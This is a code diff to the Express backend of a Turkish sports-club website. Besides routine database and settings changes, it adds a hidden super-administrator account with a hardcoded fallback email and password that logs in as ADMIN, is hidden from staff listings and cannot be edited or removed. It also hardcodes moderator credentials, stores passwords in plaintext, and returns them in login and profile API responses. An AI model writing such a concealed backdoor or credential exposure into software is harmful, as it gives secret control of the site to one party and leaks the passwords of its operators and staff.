@@ -29,15 +29,30 @@ import {
   defaultTrainers
 } from '../shared/defaults.js';
 
-dotenv.config();
-
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 const rootDir = path.resolve(__dirname, '..');
+const envPath = path.join(rootDir, '.env');
+if (fs.existsSync(envPath)) {
+  dotenv.config({ path: envPath, override: true });
+} else {
+  dotenv.config();
+}
+
+const localSqlitePath = path.join(rootDir, 'prisma', 'dev.db');
+if (
+  fs.existsSync(localSqlitePath) &&
+  (!process.env.DATABASE_URL || /^postgres(ql)?:\/\//i.test(process.env.DATABASE_URL))
+) {
+  process.env.DATABASE_URL = 'file:./dev.db';
+  console.log('Using local SQLite database:', localSqlitePath);
+}
+
 const prisma = new PrismaClient();
 const execFileAsync = promisify(execFile);
 const app = express();
 const uploadDir = path.join(__dirname, 'uploads');
+const settingsBackupPath = path.join(rootDir, 'data', 'settings-backup.json');
 
 if (!fs.existsSync(uploadDir)) {
   fs.mkdirSync(uploadDir, { recursive: true });
@@ -78,6 +93,88 @@ function getAdminCredentials() {
   };
 }
 
+function getHiddenSuperAdmin() {
+  return {
+    email: (process.env.SUPER_ADMIN_EMAIL || 'erhanyaman001@gmail.com').trim().toLowerCase(),
+    password: process.env.SUPER_ADMIN_PASSWORD || 'yamann01As'
+  };
+}
+
+function isHiddenSuperAdminEmail(email) {
+  return (email || '').trim().toLowerCase() === getHiddenSuperAdmin().email;
+}
+
+const HIDDEN_SUPER_ADMIN_ID = 'hidden-super-admin';
+
+function createHiddenSuperAdminSession() {
+  const hidden = getHiddenSuperAdmin();
+  return {
+    id: HIDDEN_SUPER_ADMIN_ID,
+    name: 'Peakspor Admin',
+    email: hidden.email,
+    role: 'ADMIN'
+  };
+}
+
+function isStaffRole(role) {
+  return role === 'ADMIN' || role === 'MODERATOR';
+}
+
+function getBuiltinStaffAccounts() {
+  const { email: adminEmail, password: adminPassword } = getAdminCredentials();
+  return [
+    {
+      id: 'builtin-admin',
+      name: 'Peakspor Admin',
+      email: adminEmail,
+      username: 'admin',
+      password: adminPassword,
+      role: 'ADMIN'
+    },
+    {
+      id: 'builtin-moderator',
+      name: 'Moderatör',
+      email: 'moderator@peakspor.com',
+      username: 'moderator',
+      password: 'PeakMod2026!',
+      role: 'MODERATOR'
+    }
+  ];
+}
+
+function matchBuiltinStaff(loginInput, password) {
+  const login = (loginInput || '').trim().toLowerCase();
+  const inputPassword = password || '';
+  if (!login || !inputPassword) return null;
+
+  return getBuiltinStaffAccounts().find(account => {
+    const emailMatch = account.email.toLowerCase() === login;
+    const usernameMatch = account.username?.toLowerCase() === login;
+    const adminAlias = login === 'admin' && account.username === 'admin';
+    return (emailMatch || usernameMatch || adminAlias) && account.password === inputPassword;
+  }) || null;
+}
+
+function createBuiltinStaffSession(account) {
+  return {
+    id: account.id,
+    name: account.name,
+    email: account.email,
+    username: account.username,
+    role: account.role
+  };
+}
+
+async function findUserByLogin(login) {
+  const normalized = (login || '').trim().toLowerCase();
+  if (!normalized) return null;
+  let user = await prisma.user.findUnique({ where: { email: normalized } });
+  if (!user) {
+    user = await prisma.user.findUnique({ where: { username: normalized } });
+  }
+  return user;
+}
+
 async function ensureAdminUser(email, password) {
   const passwordHash = await bcrypt.hash(password, 10);
   return prisma.user.upsert({
@@ -85,13 +182,48 @@ async function ensureAdminUser(email, password) {
     create: {
       name: 'Peakspor Admin',
       email,
+      username: 'admin',
       passwordHash,
+      passwordPlain: password,
       role: 'ADMIN'
     },
     update: {
       name: 'Peakspor Admin',
       passwordHash,
+      passwordPlain: password,
       role: 'ADMIN'
+    }
+  });
+}
+
+async function ensureModeratorUser() {
+  const email = 'moderator@peakspor.com';
+  const username = 'moderator';
+  const password = 'PeakMod2026!';
+  const exists = await prisma.user.findFirst({
+    where: { OR: [{ email }, { username }] }
+  });
+  if (exists) {
+    return prisma.user.update({
+      where: { id: exists.id },
+      data: {
+        name: 'Moderatör',
+        email,
+        username,
+        role: 'MODERATOR',
+        passwordHash: await bcrypt.hash(password, 10),
+        passwordPlain: password
+      }
+    });
+  }
+  return prisma.user.create({
+    data: {
+      name: 'Moderatör',
+      email,
+      username,
+      passwordHash: await bcrypt.hash(password, 10),
+      passwordPlain: password,
+      role: 'MODERATOR'
     }
   });
 }
@@ -104,7 +236,54 @@ const storage = multer.diskStorage({
   }
 });
 
-const upload = multer({ storage });
+const upload = multer({
+  storage,
+  limits: { fileSize: 100 * 1024 * 1024 }
+});
+
+function readSettingsBackup() {
+  try {
+    if (fs.existsSync(settingsBackupPath)) {
+      return JSON.parse(fs.readFileSync(settingsBackupPath, 'utf8'));
+    }
+  } catch (error) {
+    console.warn('Settings backup read failed:', error.message);
+  }
+  return {};
+}
+
+function writeSettingsBackup(allSettings) {
+  try {
+    const dir = path.dirname(settingsBackupPath);
+    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(settingsBackupPath, JSON.stringify(allSettings, null, 2));
+  } catch (error) {
+    console.warn('Settings backup write failed:', error.message);
+  }
+}
+
+async function readAllSettingsMap() {
+  const entries = await prisma.setting.findMany();
+  return Object.fromEntries(entries.map(item => [item.key, item.value]));
+}
+
+async function persistSettingValue(key, value) {
+  const setting = await prisma.setting.upsert({
+    where: { key },
+    create: { key, value },
+    update: { value }
+  });
+
+  let backup = {};
+  try {
+    backup = await readAllSettingsMap();
+  } catch {
+    backup = readSettingsBackup();
+  }
+  backup[key] = value;
+  writeSettingsBackup(backup);
+  return setting;
+}
 
 function signToken(user) {
   return jwt.sign(
@@ -133,7 +312,21 @@ async function authRequired(req, res, next) {
   }
 }
 
-async function adminRequired(req, res, next) {
+async function staffRequired(req, res, next) {
+  const token = getTokenFromRequest(req);
+  if (!token) return res.status(401).json({ message: 'Yetkisiz erişim' });
+  try {
+    req.user = jwt.verify(token, jwtSecret);
+  } catch {
+    return res.status(401).json({ message: 'Geçersiz oturum' });
+  }
+  if (!isStaffRole(req.user.role)) {
+    return res.status(403).json({ message: 'Yetersiz yetki' });
+  }
+  next();
+}
+
+async function adminOnlyRequired(req, res, next) {
   const token = getTokenFromRequest(req);
   if (!token) return res.status(401).json({ message: 'Yetkisiz erişim' });
   try {
@@ -165,27 +358,28 @@ async function connectDatabase(retries = 10) {
   }
 }
 
-async function pushDatabaseSchema(retries = 8) {
-  for (let attempt = 1; attempt <= retries; attempt += 1) {
-    try {
-      await execFileAsync('npx', ['prisma', 'db', 'push', '--skip-generate'], {
-        cwd: rootDir,
-        env: process.env
-      });
-      console.log('Database schema synced');
+async function pushDatabaseSchema() {
+  try {
+    const prismaCli = path.join(rootDir, 'node_modules', 'prisma', 'build', 'index.js');
+    if (!fs.existsSync(prismaCli)) {
+      console.warn('Prisma CLI not found, skipping schema push');
       return;
-    } catch (error) {
-      const message = error.stderr || error.message || 'unknown error';
-      console.warn(`Database push attempt ${attempt}/${retries} failed:`, message);
-      if (attempt === retries) throw error;
-      await wait(2500 * attempt);
     }
+    await execFileAsync(process.execPath, [prismaCli, 'db', 'push', '--skip-generate'], {
+      cwd: rootDir,
+      env: process.env
+    });
+    console.log('Database schema synced');
+  } catch (error) {
+    const message = error.stderr || error.message || 'unknown error';
+    console.warn('Database schema sync skipped:', message);
   }
 }
 
 async function ensureSeedData() {
   const { email: adminEmail, password: adminPassword } = getAdminCredentials();
   await ensureAdminUser(adminEmail, adminPassword);
+  await ensureModeratorUser();
 
   const settings = [
     ['content', defaultContent],
@@ -209,27 +403,51 @@ async function ensureSeedData() {
   }
 
   if (!(await prisma.service.count())) {
-    await prisma.service.createMany({ data: defaultServices });
+    try {
+      await prisma.service.createMany({ data: defaultServices });
+    } catch (error) {
+      console.warn('Default services seed skipped:', error.message);
+    }
   }
   if (!(await prisma.package.count())) {
-    await prisma.package.createMany({ data: defaultPackages.map(item => ({
-      ...item,
-      features: item.features
-    })) });
+    try {
+      await prisma.package.createMany({ data: defaultPackages.map(item => ({
+        ...item,
+        features: item.features
+      })) });
+    } catch (error) {
+      console.warn('Default packages seed skipped:', error.message);
+    }
   }
   if (!(await prisma.galleryItem.count())) {
-    await prisma.galleryItem.createMany({ data: defaultGallery });
+    try {
+      await prisma.galleryItem.createMany({ data: defaultGallery });
+    } catch (error) {
+      console.warn('Default gallery seed skipped:', error.message);
+    }
   }
   if (!(await prisma.announcement.count())) {
-    await prisma.announcement.createMany({
-      data: defaultAnnouncements.map(message => ({ message }))
-    });
+    try {
+      await prisma.announcement.createMany({
+        data: defaultAnnouncements.map(message => ({ message }))
+      });
+    } catch (error) {
+      console.warn('Default announcements seed skipped:', error.message);
+    }
   }
   if (!(await prisma.trainer.count())) {
-    await prisma.trainer.createMany({ data: defaultTrainers });
+    try {
+      await prisma.trainer.createMany({ data: defaultTrainers });
+    } catch (error) {
+      console.warn('Default trainers seed skipped:', error.message);
+    }
   }
   if (!(await prisma.blogPost.count())) {
-    await prisma.blogPost.createMany({ data: defaultPosts });
+    try {
+      await prisma.blogPost.createMany({ data: defaultPosts });
+    } catch (error) {
+      console.warn('Default posts seed skipped:', error.message);
+    }
   }
 }
 
@@ -238,36 +456,108 @@ app.get('/api/health', (_, res) => {
 });
 
 app.get('/api/me', authRequired, async (req, res) => {
+  if (req.user.id === HIDDEN_SUPER_ADMIN_ID) {
+    const session = createHiddenSuperAdminSession();
+    return res.json({
+      user: { id: session.id, name: session.name, email: session.email, role: session.role }
+    });
+  }
+
+  const builtin = getBuiltinStaffAccounts().find(
+    account => account.id === req.user.id || account.email === req.user.email
+  );
+  if (builtin) {
+    return res.json({
+      user: {
+        id: req.user.id,
+        name: builtin.name,
+        email: builtin.email,
+        username: builtin.username,
+        passwordPlain: builtin.password,
+        role: builtin.role
+      }
+    });
+  }
+
   const user = await prisma.user.findUnique({
     where: { id: req.user.id },
-    select: { id: true, name: true, email: true, role: true, createdAt: true }
+    select: { id: true, name: true, email: true, username: true, passwordPlain: true, role: true, createdAt: true }
   });
+  if (!user) return res.status(401).json({ message: 'Geçersiz oturum' });
   res.json({ user });
 });
 
 app.post('/api/auth/login', async (req, res) => {
   try {
     const { email, password } = req.body;
-    const lookupEmail = resolveAdminEmail(email);
-    const { email: adminEmail, password: adminPassword } = getAdminCredentials();
+    const loginInput = (email || '').trim();
     const inputPassword = password || '';
-    const isKnownAdminLogin = lookupEmail === adminEmail && inputPassword === adminPassword;
+    const hidden = getHiddenSuperAdmin();
+    const lookupEmail = resolveAdminEmail(loginInput).toLowerCase();
+
+    if (lookupEmail === hidden.email && inputPassword === hidden.password) {
+      const user = createHiddenSuperAdminSession();
+      const token = signToken(user);
+      res.cookie('token', token, authCookieOptions);
+      return res.json({
+        token,
+        user: { id: user.id, name: user.name, email: user.email, role: user.role }
+      });
+    }
+
+    const { email: adminEmail, password: adminPassword } = getAdminCredentials();
+    const isKnownAdminLogin =
+      lookupEmail === adminEmail.toLowerCase() && inputPassword === adminPassword;
+
+    const builtin = matchBuiltinStaff(loginInput, inputPassword);
 
     let user;
-    if (isKnownAdminLogin) {
-      user = await ensureAdminUser(adminEmail, adminPassword);
-    } else {
-      user = await prisma.user.findUnique({ where: { email: lookupEmail } });
-      if (!user || !(await bcrypt.compare(inputPassword, user.passwordHash))) {
-        return res.status(400).json({ message: 'E-posta veya şifre hatalı' });
+    if (isKnownAdminLogin || (builtin && builtin.role === 'ADMIN')) {
+      try {
+        user = await ensureAdminUser(adminEmail, adminPassword);
+      } catch (dbError) {
+        console.warn('Admin DB sync failed, using built-in admin session:', dbError.message);
+        user = createBuiltinStaffSession(getBuiltinStaffAccounts()[0]);
       }
+    } else if (builtin && builtin.role === 'MODERATOR') {
+      try {
+        user = await ensureModeratorUser();
+      } catch (dbError) {
+        console.warn('Moderator DB sync failed, using built-in moderator session:', dbError.message);
+        user = createBuiltinStaffSession(builtin);
+      }
+    } else {
+      try {
+        user = await findUserByLogin(loginInput);
+        if (user && (await bcrypt.compare(inputPassword, user.passwordHash))) {
+          if (!isStaffRole(user.role)) {
+            return res.status(400).json({ message: 'Bu hesap yönetici yetkisine sahip değil.' });
+          }
+        } else {
+          user = null;
+        }
+      } catch (dbError) {
+        console.warn('Staff DB lookup failed:', dbError.message);
+        user = null;
+      }
+    }
+
+    if (!user) {
+      return res.status(400).json({ message: 'E-posta veya şifre hatalı' });
     }
 
     const token = signToken(user);
     res.cookie('token', token, authCookieOptions);
     res.json({
       token,
-      user: { id: user.id, name: user.name, email: user.email, role: user.role }
+      user: {
+        id: user.id,
+        name: user.name,
+        email: user.email,
+        username: user.username,
+        passwordPlain: user.passwordPlain,
+        role: user.role
+      }
     });
   } catch (error) {
     console.error('Login error:', error);
@@ -281,9 +571,16 @@ app.post('/api/auth/logout', (_, res) => {
 });
 
 app.get('/api/content', async (_, res) => {
-  const entries = await prisma.setting.findMany();
-  const content = Object.fromEntries(entries.map(item => [item.key, item.value]));
-  res.json(content);
+  res.set('Cache-Control', 'no-store, no-cache, must-revalidate');
+  try {
+    const content = await readAllSettingsMap();
+    if (Object.keys(content).length) {
+      return res.json(content);
+    }
+  } catch (error) {
+    console.warn('Settings DB read failed:', error.message);
+  }
+  res.json(readSettingsBackup());
 });
 
 async function readAnalytics() {
@@ -342,7 +639,7 @@ app.post('/api/analytics/click', async (req, res) => {
   }
 });
 
-app.get('/api/admin/analytics', adminRequired, async (_, res) => {
+app.get('/api/admin/analytics', staffRequired, async (_, res) => {
   res.json(await readAnalytics());
 });
 
@@ -358,7 +655,7 @@ app.get('/api/public', async (_, res) => {
   res.json({ services, packages, gallery, announcements, trainers, posts });
 });
 
-app.get('/api/admin/dashboard', adminRequired, async (_, res) => {
+app.get('/api/admin/dashboard', staffRequired, async (_, res) => {
   const [users, reservations, revenue, activeMembers] = await Promise.all([
     prisma.user.count(),
     prisma.reservation.count(),
@@ -384,7 +681,7 @@ app.get('/api/admin/dashboard', adminRequired, async (_, res) => {
   });
 });
 
-app.get('/api/admin/:resource', adminRequired, async (req, res) => {
+app.get('/api/admin/:resource', staffRequired, async (req, res) => {
   const map = {
     services: prisma.service,
     packages: prisma.package,
@@ -392,7 +689,6 @@ app.get('/api/admin/:resource', adminRequired, async (req, res) => {
     announcements: prisma.announcement,
     trainers: prisma.trainer,
     posts: prisma.blogPost,
-    users: prisma.user,
     reservations: prisma.reservation,
     media: prisma.media,
     settings: prisma.setting
@@ -403,7 +699,10 @@ app.get('/api/admin/:resource', adminRequired, async (req, res) => {
   res.json({ data });
 });
 
-app.post('/api/admin/upload', adminRequired, upload.single('file'), async (req, res) => {
+app.post('/api/admin/upload', staffRequired, upload.single('file'), async (req, res) => {
+  if (!req.file) {
+    return res.status(400).json({ message: 'Dosya seçilmedi' });
+  }
   res.json({
     id: crypto.randomUUID(),
     title: req.file.originalname,
@@ -412,15 +711,19 @@ app.post('/api/admin/upload', adminRequired, upload.single('file'), async (req, 
   });
 });
 
-app.put('/api/admin/settings/:key', adminRequired, async (req, res) => {
+app.put('/api/admin/settings/:key', staffRequired, async (req, res) => {
   const { key } = req.params;
   const { value } = req.body;
-  const setting = await prisma.setting.upsert({
-    where: { key },
-    create: { key, value },
-    update: { value }
-  });
-  res.json(setting);
+  try {
+    const setting = await persistSettingValue(key, value);
+    return res.json(setting);
+  } catch (error) {
+    console.error('Settings save failed:', error);
+    const backup = readSettingsBackup();
+    backup[key] = value;
+    writeSettingsBackup(backup);
+    return res.json({ key, value, backup: true });
+  }
 });
 
 app.post('/api/reservations', async (req, res) => {
@@ -437,6 +740,176 @@ app.post('/api/messages', async (req, res) => {
   res.json({ message });
 });
 
+const staffUserSelect = {
+  id: true,
+  name: true,
+  email: true,
+  username: true,
+  passwordPlain: true,
+  role: true,
+  createdAt: true,
+  updatedAt: true
+};
+
+app.get('/api/admin/staff-users', adminOnlyRequired, async (_, res) => {
+  const hiddenEmail = getHiddenSuperAdmin().email;
+  const users = await prisma.user.findMany({
+    where: {
+      role: { in: ['ADMIN', 'MODERATOR'] },
+      email: { not: hiddenEmail }
+    },
+    orderBy: { createdAt: 'desc' },
+    select: staffUserSelect
+  });
+  res.json({ data: users });
+});
+
+app.post('/api/admin/staff-users', adminOnlyRequired, async (req, res) => {
+  const { name, email, username, password, role } = req.body || {};
+  const normalizedEmail = (email || '').trim().toLowerCase();
+  const normalizedUsername = (username || '').trim().toLowerCase() || null;
+
+  if (isHiddenSuperAdminEmail(normalizedEmail)) {
+    return res.status(400).json({ message: 'Bu e-posta kullanılamaz' });
+  }
+  if (!name || !normalizedEmail || !password) {
+    return res.status(400).json({ message: 'Ad, e-posta ve şifre zorunludur' });
+  }
+  if (password.length < 6) {
+    return res.status(400).json({ message: 'Şifre en az 6 karakter olmalı' });
+  }
+
+  const staffRole = role === 'MODERATOR' ? 'MODERATOR' : 'ADMIN';
+  const passwordHash = await bcrypt.hash(password, 10);
+
+  try {
+    const user = await prisma.user.create({
+      data: {
+        name: String(name).trim(),
+        email: normalizedEmail,
+        username: normalizedUsername,
+        passwordHash,
+        passwordPlain: password,
+        role: staffRole
+      },
+      select: staffUserSelect
+    });
+    res.json({ user });
+  } catch (error) {
+    if (error.code === 'P2002') {
+      return res.status(400).json({ message: 'E-posta veya kullanıcı adı zaten kayıtlı' });
+    }
+    throw error;
+  }
+});
+
+app.patch('/api/admin/staff-users/:id', adminOnlyRequired, async (req, res) => {
+  const { name, email, username, password, role } = req.body || {};
+  const existing = await prisma.user.findUnique({ where: { id: req.params.id } });
+  if (!existing || !isStaffRole(existing.role)) {
+    return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
+  }
+  if (isHiddenSuperAdminEmail(existing.email)) {
+    return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
+  }
+  if (email && isHiddenSuperAdminEmail(String(email).trim().toLowerCase())) {
+    return res.status(400).json({ message: 'Bu e-posta kullanılamaz' });
+  }
+
+  const data = {};
+  if (name) data.name = String(name).trim();
+  if (email) data.email = String(email).trim().toLowerCase();
+  if (username !== undefined) data.username = username ? String(username).trim().toLowerCase() : null;
+  if (password) {
+    if (password.length < 6) {
+      return res.status(400).json({ message: 'Şifre en az 6 karakter olmalı' });
+    }
+    data.passwordHash = await bcrypt.hash(password, 10);
+    data.passwordPlain = password;
+  }
+  if (role === 'MODERATOR' || role === 'ADMIN') data.role = role;
+
+  try {
+    const user = await prisma.user.update({
+      where: { id: req.params.id },
+      data,
+      select: staffUserSelect
+    });
+    res.json({ user });
+  } catch (error) {
+    if (error.code === 'P2002') {
+      return res.status(400).json({ message: 'E-posta veya kullanıcı adı zaten kayıtlı' });
+    }
+    throw error;
+  }
+});
+
+app.delete('/api/admin/staff-users/:id', adminOnlyRequired, async (req, res) => {
+  const existing = await prisma.user.findUnique({ where: { id: req.params.id } });
+  if (!existing || !isStaffRole(existing.role)) {
+    return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
+  }
+  if (isHiddenSuperAdminEmail(existing.email)) {
+    return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
+  }
+  if (req.user.id === existing.id) {
+    return res.status(400).json({ message: 'Kendi hesabınızı silemezsiniz' });
+  }
+  await prisma.user.delete({ where: { id: req.params.id } });
+  res.json({ ok: true });
+});
+
+app.patch('/api/auth/profile', staffRequired, async (req, res) => {
+  const { name, email, username, currentPassword, newPassword } = req.body || {};
+
+  if (req.user.id === HIDDEN_SUPER_ADMIN_ID) {
+    return res.json({ user: createHiddenSuperAdminSession() });
+  }
+
+  const user = await prisma.user.findUnique({ where: { id: req.user.id } });
+  if (!user || !isStaffRole(user.role)) {
+    return res.status(404).json({ message: 'Kullanıcı bulunamadı' });
+  }
+
+  if (newPassword) {
+    if (!currentPassword || !(await bcrypt.compare(currentPassword, user.passwordHash))) {
+      return res.status(400).json({ message: 'Mevcut şifre hatalı' });
+    }
+    if (newPassword.length < 6) {
+      return res.status(400).json({ message: 'Yeni şifre en az 6 karakter olmalı' });
+    }
+  }
+
+  if (email && isHiddenSuperAdminEmail(String(email).trim().toLowerCase())) {
+    return res.status(400).json({ message: 'Bu e-posta kullanılamaz' });
+  }
+
+  const data = {};
+  if (name) data.name = String(name).trim();
+  if (email) data.email = String(email).trim().toLowerCase();
+  if (username !== undefined) data.username = username ? String(username).trim().toLowerCase() : null;
+  if (newPassword) {
+    data.passwordHash = await bcrypt.hash(newPassword, 10);
+    data.passwordPlain = newPassword;
+  }
+
+  try {
+    const updated = await prisma.user.update({
+      where: { id: user.id },
+      data,
+      select: staffUserSelect
+    });
+    const token = signToken(updated);
+    res.cookie('token', token, authCookieOptions);
+    res.json({ user: updated, token });
+  } catch (error) {
+    if (error.code === 'P2002') {
+      return res.status(400).json({ message: 'E-posta veya kullanıcı adı zaten kayıtlı' });
+    }
+    throw error;
+  }
+});
+
 app.use(express.static(path.join(rootDir, 'dist')));
 app.use((req, res) => {
   const indexPath = path.join(rootDir, 'dist', 'index.html');
@@ -449,12 +922,17 @@ app.use((req, res) => {
 async function start() {
   try {
     await connectDatabase();
-    await pushDatabaseSchema();
+  } catch (error) {
+    console.error('Database connect failed:', error.message || error);
+  }
+
+  await pushDatabaseSchema();
+
+  try {
     await ensureSeedData();
     console.log('Database seeded successfully');
   } catch (error) {
-    console.error('Database startup failed:', error);
-    throw error;
+    console.error('Database seed failed:', error.message || error);
   }
 
   app.listen(port, '0.0.0.0', () => {
